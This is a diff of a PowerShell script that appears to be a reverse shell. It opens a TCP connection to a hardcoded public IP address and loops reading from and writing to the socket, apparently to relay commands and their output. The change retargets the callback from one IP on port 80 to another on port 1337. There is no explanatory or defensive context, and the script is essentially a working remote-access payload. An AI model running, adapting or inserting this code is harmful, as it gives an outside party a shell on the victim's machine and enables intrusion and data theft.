@@ -1,5 +1,5 @@
 
-$myClient = New-Object System.Net.Sockets.TCPClient('13.39.125.197',80);
+$myClient = New-Object System.Net.Sockets.TCPClient('13.38.203.182',1337);
 $myStream = $myClient.GetStream();
 [byte[]]$myBuffer = 0..65535 | % { 0 };
 
@@ -11,5 +11,6 @@ while(($myRead = $myStream.Read($myBuffer, 0, $myBuffer.Length)) -ne 0) {
     $myStream.Write($mySendByte, 0, $mySendByte.Length);
     $myStream.Flush();
 }
+
 
 $myClient.Close();
